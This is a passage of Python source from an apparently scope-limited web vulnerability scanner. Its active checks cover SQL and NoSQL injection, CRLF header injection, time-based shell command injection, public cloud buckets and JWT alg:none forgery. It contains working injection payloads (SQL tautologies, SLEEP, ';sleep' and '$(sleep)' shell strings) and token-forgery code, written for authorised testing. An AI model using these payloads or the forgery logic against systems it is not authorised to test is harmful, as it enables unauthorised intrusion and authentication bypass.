        return None  # need a URL or recon-discovered param to perturb; never invent one blindly
    for param in params:
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            control = http.fetch(_with_query(url, {param: original}))  # unmodified baseline, once per param
        except _ActiveError:
            continue
        ctrl_body = control.get("body") or ""
        if _SQL_ERROR_RE.search(ctrl_body):
            continue  # the unmodified response already carries a SQL banner -> not perturbation-driven
        for payload, shown in _SQLI_QUOTE_VARIANTS:
            try:
                probe = http.fetch(_with_query(url, {param: original + payload}))
            except _ActiveError:
                break  # out of budget for this param — move on
            body = probe.get("body") or ""
            # SQL-ONLY signature: a generic Python/PHP/Java stack trace from a broken quote is NOT SQL
            # injection. Only a real database error banner (absent from the control) confirms.
            sql_hit = _SQL_ERROR_RE.search(body)
            if sql_hit:
                proof = _proof(
                    "confirmed", method=f"GET with {param}={original}{payload} ({shown})", affected_asset="the database reachable by the query's role",
                    observed_result=f"appending {shown} to '{param}' produced a SQL database error in the response",
                    control_result="the unmodified parameter returned no SQL error — the perturbation broke the query",
                    evidence="a SQL error banner (SQLSTATE/ORA-/SQL syntax) surfaced after the injected character",
                )
                ev = {"request_line": f"GET {_with_query(url, {param: original + payload})}", "response_status": f"HTTP {probe['status']}",
                      "matched_value": f"SQL database error banner surfaced by the injected {shown}",
                      "read_data": _context_excerpt(body, sql_hit.group(0))}  # the actual DB error text in the response
                return _finding("active.sqli-error", f"SQL error elicited via '{param}' (probable SQL injection)", "high", "disclosure", "sqli", url, proof, ev)
    return None


def _with_operator(url: str, param: str, value: str) -> str:
    """Replace a scalar query param with a NoSQL OPERATOR-OBJECT key (``param`` -> ``param[$ne]``)
    so an Express/qs-style parser materialises ``{param: {$ne: value}}`` server-side. The plain
    param is dropped so the server sees a single, unambiguous operator object."""
    parsed = urlparse(url)
    existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
    existing.pop(param, None)
    existing[f"{param}[$ne]"] = value
    return urlunparse(parsed._replace(query=urlencode(existing)))


def _check_nosqli(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Error-based NoSQL injection: send a param as an operator object ({$ne: ...}); a NoSQL
    backend error banner that appears ONLY for the operator (not the scalar control) confirms
    a NoSQL injection point (e.g. Mongoose casting {$ne:...} to a typed field). High precision,
    mirroring the SQL-error check; a generic stack trace never confirms."""
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 3)
    if not params:
        return None  # need a URL or recon-discovered param; never invent an injection point
    base_q = dict(parse_qsl(parsed.query, keep_blank_values=True))
    for param in params:
        original = base_q.get(param, "1")
        try:
            probe = http.fetch(_with_operator(url, param, original))   # param -> {$ne: original}
            control = http.fetch(_with_query(url, {param: original}))  # plain scalar baseline
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        nosql_hit = _NOSQL_ERROR_RE.search(body)
        ctrl_matched = bool(_NOSQL_ERROR_RE.search(ctrl_body))
        if nosql_hit and not ctrl_matched:
            proof = _proof(
                "confirmed", method=f"GET with {param}[$ne]={original} (operator-object injection)",
                affected_asset="the NoSQL datastore reachable by this query's role",
                observed_result=f"sending '{param}' as an operator object ({{$ne: ...}}) produced a NoSQL backend error",
                control_result="the same parameter as a plain scalar returned no NoSQL error — the operator object broke the query",
                evidence="a NoSQL backend error banner (MongoError / Mongoose CastError / BSONError) surfaced after the operator injection",
            )
            ev = {"request_line": f"GET {_with_operator(url, param, original)}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": "NoSQL error banner",
                  # The ACTUAL NoSQL error text in the response — the concrete proof, mirroring error-SQLi.
                  "read_data": _context_excerpt(body, nosql_hit.group(0))}
            return _finding("active.nosqli-error", f"NoSQL injection via '{param}' (operator object elicited a NoSQL error)", "high", "injection", "nosqli", url, proof, ev)
    return None


def _norm_len(body: str) -> int:
    """Length of the body with volatile whitespace collapsed, so a stable page
    compares stably across reads (CSRF tokens / timestamps still flap — handled by
    the baseline-stability gate, not here)."""
    return len(re.sub(r"\s+", " ", body or ""))


def _check_bool_sqli(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Boolean-based blind SQLi, GET-only, no timing/SLEEP, no data extraction — just
    one boolean bit. Confirms ONLY when the page is stable across two baselines AND a
    TRUE tautology tracks the baseline while a FALSE contradiction diverges materially.
    The two matching baselines ARE the negative control: a page that flaps on its own
    can't be differentiated, so it degrades to candidate rather than over-claiming."""
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 2)
    if not params:
        return None  # need a URL or recon-discovered param; never invent injection points
    for param in params:
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            base1 = http.fetch(_with_query(url, {param: original}))
            base2 = http.fetch(_with_query(url, {param: original}))
            t_resp = http.fetch(_with_query(url, {param: original + "' AND '1'='1"}))
            f_resp = http.fetch(_with_query(url, {param: original + "' AND '1'='2"}))
        except _ActiveError:
            continue
        b1, b2 = _norm_len(base1.get("body") or ""), _norm_len(base2.get("body") or "")
        tl, fl = _norm_len(t_resp.get("body") or ""), _norm_len(f_resp.get("body") or "")
        ref = max(b1, 1)
        # Page must be STABLE (two unmodified reads near-identical) to be differentiable.
        if abs(b1 - b2) > max(8, ref * 0.02):
            continue  # dynamic page — not safely confirmable here
        tight, loose = max(8, ref * 0.02), max(24, ref * 0.05)
        # A real boolean bit makes TRUE and FALSE produce DIFFERENT pages, ONE of which matches the
        # stable baseline. NORMAL polarity: the baseline is the TRUE result (TRUE tracks, FALSE
        # diverges). INVERSE polarity: the baseline is the empty/FALSE result (FALSE tracks, TRUE
        # diverges) — the identical real bug on an endpoint that returns nothing by default, which the
        # old TRUE-only gate silently dropped. The two are mutually exclusive (tight < loose).
        normal = abs(tl - b1) <= tight and abs(fl - b1) > loose
        inverse = abs(fl - b1) <= tight and abs(tl - b1) > loose
        if not (normal or inverse):
            continue
        # Reject an INFRASTRUCTURE differential masquerading as a DB boolean: a WAF/error
        # page of a different length satisfies the length test without any DB involvement.
        # Both responses must be a normal 200, and neither may carry a SQL-error banner
        # (that would be error-based, not boolean).
        if int(t_resp.get("status") or 0) != 200 or int(f_resp.get("status") or 0) != 200:
            continue
        if _SQL_ERROR_RE.search(f_resp.get("body") or "") or _SQL_ERROR_RE.search(t_resp.get("body") or ""):
            continue
        # Second confirmation pass: the divergence must REPRODUCE in the SAME direction, ruling out a
        # coincidental one-off length flap (cache, rotating ad, per-request token).
        try:
            t2 = http.fetch(_with_query(url, {param: original + "' AND '1'='1"}))
            f2 = http.fetch(_with_query(url, {param: original + "' AND '1'='2"}))
        except _ActiveError:
            continue
        tl2, fl2 = _norm_len(t2.get("body") or ""), _norm_len(f2.get("body") or "")
        reproduced = (abs(tl2 - b1) <= tight and abs(fl2 - b1) > loose) if normal else (abs(fl2 - b1) <= tight and abs(tl2 - b1) > loose)
        if not reproduced:
            continue  # divergence did not reproduce in the same direction — not safely confirmable
        tracking, diverging = ("TRUE", "FALSE") if normal else ("FALSE", "TRUE")
        div_len = fl if normal else tl
        proof = _proof(
            "confirmed", method=f"GET with {param}=...' AND '1'='1 vs ...' AND '1'='2 (reproduced twice)",
            affected_asset="the database reachable by the query's role (boolean-inferable)",
            observed_result=f"the {tracking} condition returned a page matching the stable baseline (~{b1} chars) while the {diverging} condition diverged (~{div_len} chars), reproduced on a second pass",
            control_result=f"two unmodified requests returned near-identical pages (~{b1}/{b2} chars), both conditions were 200 with no SQL-error banner, so the difference tracks the injected boolean — not a WAF/error page",
            evidence=f"normalized lengths baseline={b1}/{b2}, TRUE={tl}/{tl2}, FALSE={fl}/{fl2} ({'normal' if normal else 'inverse'} polarity)",
        )
        ev = {"request_line": f"GET {_with_query(url, {param: original + chr(39) + ' AND ' + chr(39) + '1' + chr(39) + '=' + chr(39) + '2'})}",
              "response_status": f"HTTP {t_resp['status']}", "matched_value": f"{diverging} page diverged by {abs(div_len - b1)} chars from a stable baseline"}
        return _finding("active.sqli-boolean", f"Boolean-based blind SQL injection via '{param}'", "high", "disclosure", "sqli", url, proof, ev)
    return None


def _check_crlf(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """CRLF / response-header injection, GET-only. Injects an encoded CRLF + a benign
    custom-header marker into a param; confirms ONLY when the server SPLITS it into a
    real response header equal to the marker AND a control without the CRLF does not —
    proving the value crossed into the header block. Benign marker header only; nothing
    that affects other users' traffic (contrast request smuggling)."""
    candidates = _redirect_candidates(url, extra_params, _REDIRECT_PARAMS, 3)
    # RAW CR/LF — _with_query's urlencode encodes it ONCE to %0D%0A (pre-encoding here
    # would double-encode to %250D%250A and never inject a real newline).
    marker_value = f"\r\nX-Greyiq-Crlf:{_MARK}"
    for param in candidates:
        try:
            probe = http.fetch(_with_query(url, {param: marker_value}))
            control = http.fetch(_with_query(url, {param: f"X-Greyiq-Crlf-{_MARK}"}))
        except _ActiveError:
            continue
        injected = (probe["headers"].get("x-greyiq-crlf") or "").strip()
        ctrl_injected = (control["headers"].get("x-greyiq-crlf") or "").strip()
        if injected == _MARK and ctrl_injected != _MARK:
            proof = _proof(
                "confirmed", method=f"GET with {param} carrying an encoded CRLF + marker header",
                affected_asset="response headers (header injection, cache poisoning, cookie setting, XSS via header)",
                observed_result=f"the server split the '{param}' value into a real 'X-Greyiq-Crlf: {_MARK}' response header — the CRLF was honored",
                control_result="the same marker WITHOUT a CRLF did not produce the header, proving the newline was the cause",
                evidence=f"X-Greyiq-Crlf: {_MARK} present in the response headers",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: marker_value})}", "response_status": f"HTTP {probe['status']}",
                  # Emit the split-out header as a real response-header line so the reconstructed
                  # request/response shows the injected header exactly as it landed on the wire.
                  "response_header": f"X-Greyiq-Crlf: {_MARK}",
                  "matched_value": f"injected response header X-Greyiq-Crlf: {_MARK}"}
            return _finding("active.crlf", f"CRLF / response-header injection via '{param}'", "high", "disclosure", "redirect", url, proof, ev)
    return None


# Time-based blind SQLi sends a small, FIXED, bounded SLEEP — the one check that emits
# an executing payload, so it is OPT-IN (off by default) and held to a strict envelope:
# a constant delay we control (no amplification), well under the fetch timeout, request-
# only timing (excludes the governor throttle), and a multi-trial differential with a
# fast SLEEP(0) negative control. No data is ever read or extracted — one timing bit.
# The delay/margin default to 4s/3s and are tunable via settings (jittery targets).
_TIME_DELAY_S = 4          # the injected sleep (fixed; < web_fetch_timeout_seconds, default 8)
_TIME_MARGIN_S = 3.0       # a confirmed probe must be at least this much slower than the fast controls


def _check_time_sqli(http: _Http, url: str, settings: Any = None, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    settings = settings or get_settings()
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 1)
    if not params:
        return None  # need a URL or recon-discovered param; never invent injection points
    d = getattr(settings, "active_time_sqli_delay_seconds", _TIME_DELAY_S) or _TIME_DELAY_S
    margin = getattr(settings, "active_time_sqli_margin_seconds", _TIME_MARGIN_S) or _TIME_MARGIN_S
    # Keep the injected delay strictly under the fetch timeout so a confirmed probe never
    # trips the timeout (which would read as an error, not a delay).
    d = min(float(d), max(1.0, float(settings.web_fetch_timeout_seconds) - 1.0))
    # If a reduced fetch timeout clamped the delay below the confirm margin, the differential could
    # NEVER pass and a real blind SQLi would be silently missed. Clamp the margin below the clamped
    # delay (floor 1.0s so we never confirm on sub-second noise) so the check degrades gracefully.
    margin = min(float(margin), max(1.0, d - 1.0))
    # MySQL/MariaDB SLEEP is the most common; a single fixed payload keeps requests bounded.
    d_str = str(int(d)) if float(d).is_integer() else f"{d:.1f}"  # SLEEP(4), not SLEEP(4.0)
    slow = f"' AND SLEEP({d_str})-- -"
    fast = "' AND SLEEP(0)-- -"
    for param in params:  # one param — the timing pass is request-heavy
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            base = http.fetch(_with_query(url, {param: original}))
            ctrl = http.fetch(_with_query(url, {param: original + fast}))   # injected, but SLEEP(0) -> fast (negative control)
            p1 = http.fetch(_with_query(url, {param: original + slow}))
            p2 = http.fetch(_with_query(url, {param: original + slow}))     # second trial to rule out jitter
        except _ActiveError:
            continue
        fast_max = max(float(base.get("elapsed") or 0.0), float(ctrl.get("elapsed") or 0.0))
        e1, e2 = float(p1.get("elapsed") or 0.0), float(p2.get("elapsed") or 0.0)
        # Confirm ONLY when both SLEEP(D) probes are >= D-margin slower than BOTH fast
        # controls (the unmodified baseline AND the injected-but-SLEEP(0) request). The
        # SLEEP(0) control proves the delay tracks the injected value, not a slow page.
        if e1 - fast_max >= margin and e2 - fast_max >= margin:
            proof = _proof(
                "confirmed", method=f"GET with {param}=...' AND SLEEP({d_str}) (bounded, no data read)",
                affected_asset="the database reachable by the query's role (time-inferable blind SQLi)",
                observed_result=f"injecting SLEEP({d_str}) delayed the response to ~{e1:.1f}s/{e2:.1f}s across two trials",
                control_result=f"the unmodified request and a SLEEP(0) injection both returned in ~{fast_max:.1f}s — the delay tracks the injected sleep",
                evidence=f"request-only timing: baseline/SLEEP(0)≈{fast_max:.1f}s, SLEEP({d_str})≈{e1:.1f}s and {e2:.1f}s",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: original + slow})}", "response_status": f"HTTP {p1['status']}",
                  "matched_value": f"SLEEP({d_str}) caused a ~{e1:.1f}s delay vs ~{fast_max:.1f}s control"}
            return _finding("active.sqli-time", f"Time-based blind SQL injection via '{param}'", "high", "disclosure", "sqli", url, proof, ev)
    return None


def _check_time_rce(http: _Http, url: str, settings: Any = None, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Blind OS command injection confirmed by TIMING — the RCE sibling of the time-based SQLi
    check. Injects a bounded ``sleep`` across the common shell-injection contexts and confirms
    ONLY on a stable two-trial delay differential vs a ``sleep 0`` negative control (the delay
    must track the injected sleep, not a slow page). ``sleep`` touches nothing and reads nothing —
    one timing bit. Because it emits an executing payload it is OPT-IN (time_based), exactly like
    time-based SQLi. A non-vulnerable app never actually sleeps, so it stays fast."""
    settings = settings or get_settings()
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, _RCE_PARAMS, 1)
    if not params:
        return None  # need a URL or recon-discovered param; never invent injection points
    d = getattr(settings, "active_time_sqli_delay_seconds", _TIME_DELAY_S) or _TIME_DELAY_S
    margin = getattr(settings, "active_time_sqli_margin_seconds", _TIME_MARGIN_S) or _TIME_MARGIN_S
    d = min(float(d), max(1.0, float(settings.web_fetch_timeout_seconds) - 1.0))
    # Clamp the margin below the (possibly timeout-reduced) delay so a real blind RCE isn't silently
    # missed when the delay drops below the fixed margin (floor 1.0s to avoid sub-second-noise confirms).
    margin = min(float(margin), max(1.0, d - 1.0))
    ds = str(int(d)) if float(d).is_integer() else f"{d:.1f}"
    # The common places a value lands in a shell: command separator, substitution (both forms),
    # and pipe. Each confirmed independently by its own two-trial timing differential.
    slow_variants = (f";sleep {ds}", f"$(sleep {ds})", f"`sleep {ds}`", f"|sleep {ds}")
    for param in params:  # one param — the timing pass is request-heavy
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            base = http.fetch(_with_query(url, {param: original}))
        except _ActiveError:
            continue
        base_e = float(base.get("elapsed") or 0.0)
        for payload in slow_variants:
            try:
                p1 = http.fetch(_with_query(url, {param: original + payload}))
            except _ActiveError:
                break
            if float(p1.get("elapsed") or 0.0) - base_e < margin:
                continue  # not slow -> this context isn't injectable (a non-vulnerable app returns fast)
            # It IS slow — but a WAF / bot-defense that tarpits on the shell metacharacter (`$(`, a
            # backtick, `;`) would delay it too, WITHOUT any command injection. Disambiguate with a
            # MATCHED control: the SAME wrapper carrying 'sleep 0'. A per-metacharacter tarpit delays
            # this control equally (differential cancels -> not confirmed); a real shell runs 'sleep 0'
            # fast, so only genuine execution keeps the differential. Second slow trial rules out jitter.
            control_payload = payload.replace(f"sleep {ds}", "sleep 0")
            try:
                ctrl = http.fetch(_with_query(url, {param: original + control_payload}))
                p2 = http.fetch(_with_query(url, {param: original + payload}))
            except _ActiveError:
                break
            fast_max = max(base_e, float(ctrl.get("elapsed") or 0.0))
            e1, e2 = float(p1.get("elapsed") or 0.0), float(p2.get("elapsed") or 0.0)
            if e1 - fast_max >= margin and e2 - fast_max >= margin:
                proof = _proof(
                    "confirmed", method=f"GET with {param}=...{payload} (bounded sleep, nothing read or changed)",
                    affected_asset="the application server — blind OS command execution in the query's shell context",
                    observed_result=f"injecting a shell '{payload.strip()}' delayed the response to ~{e1:.1f}s/{e2:.1f}s across two trials",
                    control_result=f"the SAME wrapper carrying 'sleep 0' ({control_payload.strip()}) returned in ~{fast_max:.1f}s — the delay tracks the injected sleep VALUE, not the metacharacter, so a WAF tarpit on the syntax is ruled out",
                    evidence=f"request-only timing: matched 'sleep 0' control≈{fast_max:.1f}s, sleep({ds})≈{e1:.1f}s and {e2:.1f}s",
                )
                ev = {"request_line": f"GET {_with_query(url, {param: original + payload})}", "response_status": f"HTTP {p1['status']}",
                      "matched_value": f"shell 'sleep {ds}' caused a ~{e1:.1f}s delay vs ~{fast_max:.1f}s control"}
                return _finding("active.rce-time", f"Blind OS command injection via '{param}' (time-based)",
                                "critical", "injection", "rce", url, proof, ev)
    return None


_BUCKET_RE = re.compile(
    r"https?://(?:"
    r"([a-z0-9][a-z0-9.\-]{1,200}\.s3[.\-][a-z0-9.\-]*amazonaws\.com)"          # S3 virtual-hosted
    r"|(storage\.googleapis\.com/[a-z0-9._\-]{3,200})"                            # GCS
    r"|([a-z0-9][a-z0-9.\-]{1,200}\.blob\.core\.windows\.net/[a-z0-9._\-]{1,200})"  # Azure
    r")", re.IGNORECASE)


def _bucket_listing_request(bucket_url: str, host: str) -> tuple[str, str]:
    """Return (list_url, provider) for the bucket-listing GET. The regex match may
    capture a deep object path (e.g. a referenced asset under the bucket), not just the
    bucket/container root, so this also truncates to the root first — only the root
    accepts a listing query for any of the three providers."""
    parsed = urlparse(bucket_url)
    if "amazonaws.com" in host:
        # S3 virtual-hosted: the bucket IS the host: https://<bucket>.s3...amazonaws.com/
        # — no object-path segment to strip; list-type=2 on the root lists it.
        return f"{parsed.scheme}://{parsed.netloc}/?list-type=2", "s3"
    # GCS / Azure: the bucket/container name is the FIRST path segment after the host.
    segments = [s for s in parsed.path.split("/") if s]
    root_path = segments[0] if segments else ""
    if "blob.core.windows.net" in host:
        # Azure container listing needs an explicit restype=container&comp=list on the
        # CONTAINER root — a bare GET (even to the root) does not list.
        return f"{parsed.scheme}://{parsed.netloc}/{root_path}?restype=container&comp=list", "azure"
    # GCS XML API: a bare GET to the bucket root already returns an anonymous listing
    # when public-read is granted — no extra query needed.
    return f"{parsed.scheme}://{parsed.netloc}/{root_path}", "gcs"


def _check_open_bucket(http: _Http, landing: dict[str, Any] | None, scope: str, settings: Any) -> dict[str, Any] | None:
    """Open cloud-bucket exposure for buckets the PAGE references. Strictly scope-gated:
    a bucket host MUST pass host_in_active_scope (a third-party bucket is not auto-in-
    scope — those degrade to a candidate note). GET-only list endpoint; confirms only on
    an anonymous directory listing; 403/AccessDenied is the negative control -> candidate."""
    body = (landing or {}).get("body") or ""
    if not body:
        return None
    candidates: list[str] = []
    for m in _BUCKET_RE.finditer(body):
        u = m.group(0).rstrip("/\"'")
        if u not in candidates:
            candidates.append(u)
        if len(candidates) >= 8:
            break
    referenced_out_of_scope = 0
    denied_finding: dict[str, Any] | None = None
    for bucket_url in candidates[:6]:
        host = urlparse(bucket_url).hostname or ""
        if not host_in_active_scope(host, scope, settings):
            referenced_out_of_scope += 1
            continue  # never probe a bucket host the operator didn't put in scope
        list_url, provider = _bucket_listing_request(bucket_url, host)
        try:
            resp = http.fetch(list_url)
        except (_ActiveError, WebsiteFetchError):
            # This check fetches a FOREIGN host (the bucket), so unlike the other
            # checks it can hit the SSRF/port guard (e.g. a bucket whose host resolves
            # to a private IP when private URLs are off). Skip it — never abort the pass.
            continue
        rbody = (resp.get("body") or "")[:4000]
        status = int(resp.get("status") or 0)
        # Anonymous listing (body may be truncated by the fetch cap — match the opening).
        # S3 (list-type=2) and GCS's XML API share the <ListBucketResult>/<Contents>
        # shape; Azure's container listing uses a distinct <EnumerationResults>/<Blobs>
        # shape — each provider is matched by its own real response format.
        if provider == "azure":
            is_listing = status == 200 and "<EnumerationResults" in rbody and "<Blobs>" in rbody
        else:
            is_listing = status == 200 and ("<ListBucketResult" in rbody and ("<Key>" in rbody or "<Contents>" in rbody))
        denied = "AccessDenied" in rbody or status in (401, 403, 404)
        if is_listing:
            proof = _proof(
                "confirmed", method=f"GET {list_url}", affected_asset="every object in the referenced cloud bucket",
                observed_result="the bucket returned an anonymous directory listing (public read)",
                control_result="a locked bucket returns 403/AccessDenied — this one listed its contents to an unauthenticated request",
                evidence="anonymous ListBucketResult with object keys",
            )
            # NOTE: object keys are deliberately NOT echoed as read_data — unlike other disclosure
            # checks (which capture the TARGET's own data), a bucket listing is a third party's file
            # NAMES, which can themselves be sensitive. The structural match + control differential +
            # reconstructed request/response prove the anonymous listing without leaking the keys; a
            # triager reproduces the full listing with the request line shown above.
            ev = {"request_line": f"GET {list_url}", "response_status": f"HTTP {status}", "matched_value": "public ListBucketResult (object keys redacted)"}
            return _finding("active.open-bucket", "Public cloud bucket (anonymous listing)", "high", "disclosure", "cloud-exposure", bucket_url, proof, ev)
        if denied and denied_finding is None:
            # Record the FIRST denied bucket but KEEP probing the remaining candidates —
            # a publicly-listable (high) bucket referenced after a denied one must never be
            # masked by an early return on the low candidate.
            proof = _proof("candidate", method=f"GET {list_url}",
                           observed_result="the referenced bucket exists but denied anonymous listing (403/AccessDenied)",
                           limitations="The bucket is not publicly listable; individual objects or write access may still be testable.",
                           proof_obligation="Probe specific object keys / test write access within scope to assess impact.")
            ev = {"request_line": f"GET {list_url}", "response_status": f"HTTP {status}", "matched_value": "AccessDenied (bucket exists, not public)"}
            denied_finding = _finding("active.open-bucket", "Cloud bucket referenced (access denied — candidate)", "low", "disclosure", "cloud-exposure", bucket_url, proof, ev)
    # No public listing among any in-scope bucket. Surface the denied candidate if we saw
    # one, else the out-of-scope reference note.
    if denied_finding is not None:
        return denied_finding
    if referenced_out_of_scope:
        proof = _proof("candidate", method="page reference (not probed)",
                       observed_result=f"the page references {referenced_out_of_scope} cloud bucket(s) whose host is not in your scope",
                       limitations="Bucket hosts outside the program scope are never probed.",
                       proof_obligation="If the bucket is in scope, add its host to Scope and re-run to verify public access.")
        ev = {"request_line": "(page reference)", "matched_value": f"{referenced_out_of_scope} referenced bucket(s) out of scope"}
        return _finding("active.open-bucket", "Cloud bucket referenced (out of scope — add to verify)", "info", "disclosure", "cloud-exposure", "", proof, ev)
    return None


def _b64url_decode(segment: str) -> bytes:
    padded = segment + "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _corrupt_jwt_signature(sig_b64: str) -> str:
    """A base64url signature GUARANTEED to differ from ``sig_b64`` — flip a bit of the DECODED bytes.
    Flipping only the trailing base64url character is a no-op ~25% of the time for RSA-sized (256-byte)
    signatures, because that last char's high bits are unused padding, so the 'corrupted' token can
    decode to the identical valid signature and the negative control silently passes (a false negative
    that defeats a real signature-bypass confirmation). Corrupting a decoded byte always changes it."""
    try:
        raw = bytearray(_b64url_decode(sig_b64))
    except (ValueError, binascii.Error):
        raw = bytearray()
    if not raw:
        return "AAAA"  # empty/undecodable signature -> a clearly-invalid, non-empty placeholder
    raw[0] ^= 0x01     # flip the low bit of the first byte -> a definitely-different signature
    return _b64url_encode(bytes(raw))


def _find_jwt_credential(auth: AuthContext | None) -> tuple[str, str, Callable[[str], str]] | None:
    """The first JWT-shaped credential in the operator's supplied auth (an
    Authorization: Bearer header, or a Cookie crumb), as (header_name, current_token,
    rebuild(new_token) -> new_full_header_value). None if no JWT-shaped value is
    present — this check is opt-in-by-having-auth, never invents a session."""
    if auth is None:
        return None
    for name, value in auth.headers.items():
        if name.lower() != "authorization":
            continue
        parts = value.split(None, 1)
        if len(parts) == 2 and parts[0].lower() == "bearer" and _JWT_RE.match(parts[1].strip()):
            prefix, token = parts[0] + " ", parts[1].strip()
            return ("Authorization", token, lambda new: prefix + new)
    for name, value in auth.headers.items():
        if name.lower() != "cookie":
            continue
        crumbs = [c.strip() for c in value.split(";") if c.strip()]
        for i, crumb in enumerate(crumbs):
            cname, sep, cvalue = crumb.partition("=")
            if sep and _JWT_RE.match(cvalue.strip()):
                def rebuild(new_token: str, i: int = i, crumbs: list[str] = crumbs, cname: str = cname) -> str:
                    out = list(crumbs)
                    out[i] = f"{cname}={new_token}"
                    return "; ".join(out)
                return ("Cookie", cvalue.strip(), rebuild)
    return None


def _extract_jwt_token(response: dict[str, Any] | None) -> str:
    """The first JWT-shaped token the target itself exposed in a response — its body, a Set-Cookie
    crumb, or a header. Lets the alg:none check run on a token the APP issued even when the operator
    supplied no credential (the exact reasoning a human does: 'the app handed me a JWT — is it
    forgeable?'). Returns "" if none/ambiguous. The check independently re-validates that the token
    actually authenticates (a 200 baseline) before proving anything, so a stray/expired token is a
    clean no-op, never a false positive."""
    if not isinstance(response, dict):
        return ""
    # Cookies first (a Set-Cookie JWT is the app's own session), then the body, then other headers.
    for crumb in (response.get("cookies") or []):
        _n, sep, cval = str(crumb).split(";", 1)[0].partition("=")
        if sep and _JWT_RE.match(cval.strip()):
            return cval.strip()
    for source in (str(response.get("body") or "")[:_JWT_SCAN_CAP],
                   "\n".join(str(v) for v in (response.get("headers") or {}).values())):
        for m in _EMBEDDED_JWT_RE.finditer(source):
            if _forge_alg_none_variants(m.group(0)):  # only a well-formed, non-alg:none token
                return m.group(0)
    return ""


_JWT_SCAN_CAP = 200_000  # never scan more than ~200 KB of body for a token


def _forge_alg_none_variants(token: str) -> list[str]:
    """The alg:none-forged variants of `token` (same header keys except alg, SAME
    payload bytes, empty signature) -- both the RFC-correct 'header.payload.' form
    and the bare 'header.payload' form some JWT libraries also accept. Returns []
    when the token is malformed, already alg:none (nothing to forge), or otherwise
    unusable — the caller treats that as "skip this check", never a crash."""
    parts = token.split(".")
    if len(parts) != 3 or not parts[0] or not parts[1]:
        return []
    try:
        header_obj = json.loads(_b64url_decode(parts[0]))
    # RecursionError (a RuntimeError, NOT a ValueError subclass) is raised by json.loads on a
    # crafted deeply-nested header from an untrusted target token — catch it so a malformed token
    # is a clean skip, never a crash that aborts the whole active pass.
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError, RecursionError):
        return []
    if not isinstance(header_obj, dict) or str(header_obj.get("alg", "")).strip().lower() == "none":
        return []
    header_obj["alg"] = "none"
    try:
        forged_header = _b64url_encode(json.dumps(header_obj, separators=(",", ":")).encode("utf-8"))
    except (TypeError, ValueError):
        return []
    return [f"{forged_header}.{parts[1]}.", f"{forged_header}.{parts[1]}"]


# Body-similarity confirm gate for the JWT forgery checks. A forged token is only proof of a bypass
# if the response it unlocks is the SAME authenticated content the REAL token returns — a bare 2xx
# status can be an anonymous/public page that a signature-verifying server still serves for a no-auth
# request (corrupted-sig rejected with 401, but alg:none decoded to "no claims" and served the public
# page with 200). Confirming on status alone false-positives a CRITICAL there. Mirrors the
# observed-vs-baseline discipline of run_bfla_check/run_idor_check (access_control_service._SAME);
# kept self-contained here because access_control_service imports THIS module (avoid an import cycle).
_JWT_BODY_SAME = 0.95
_JWT_MIN_BODY = 8
_JWT_BODY_CMP_CAP = 6000


def _body_similar(a: str, b: str) -> float:
    """difflib similarity in [0,1] over whitespace-normalized, length-capped bodies. Two empty bodies
    are 1.0; one-empty-one-not is 0.0 (an empty forged response never matches a real authenticated one)."""
    na = " ".join(str(a or "").split())[:_JWT_BODY_CMP_CAP]
    nb = " ".join(str(b or "").split())[:_JWT_BODY_CMP_CAP]
    if not na and not nb:
        return 1.0
    if not na or not nb:
        return 0.0
    return difflib.SequenceMatcher(None, na, nb).ratio()


def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
    """Confirm the server accepts an UNSIGNED (alg:none) copy of a real session token as
    authenticated — one of the highest-signal, lowest-effort JWT bugs in real programs.

    Two token sources, never an invented one:
    * The operator's supplied JWT credential (Authorization/Cookie) — the forged/control requests
      reuse that SAME authenticated GET, proving nothing beyond what the operator authorized.
    * A JWT the TARGET ITSELF exposed (``discovered_token`` from the landing response) when the
      operator gave none — attached as ``Authorization: Bearer`` with a SELF-CONTAINED baseline
      (a request that carries the discovered token), so the differential is entirely about that token.

    Either way the proof is the differential: the real token authenticates (200 baseline) AND a
    corrupted-signature copy is REJECTED (the server does verify) AND the alg:none copy is ACCEPTED."""
    found = _find_jwt_credential(http.auth)
    baseline_headers: dict[str, str] | None = None
    if found is not None:
        header_name, real_token, rebuild = found
    elif discovered_token and _JWT_RE.match(discovered_token):
        # The target handed us a JWT but the operator supplied no auth — test the app's OWN token.
        header_name, real_token = "Authorization", discovered_token
        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
        baseline_headers = {header_name: rebuild(real_token)}  # the baseline must CARRY the discovered token
    else:
        return None
    forged_variants = _forge_alg_none_variants(real_token)
    if not forged_variants:
        return None
    try:
        # Operator path: http.auth is auto-attached. Discovered path: attach the discovered token.
        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
    except _ActiveError:
        return None
    if not (200 <= int(baseline.get("status") or 0) < 300):
        return None  # can't establish what an "authenticated" response even looks like here
    baseline_body = str(baseline.get("body") or "")
    if len(" ".join(baseline_body.split())) < _JWT_MIN_BODY:
        return None  # no substantive authenticated body to differentiate against -> can't prove a bypass
    parts = real_token.split(".")
    corrupted_sig = _corrupt_jwt_signature(parts[2])
    try:
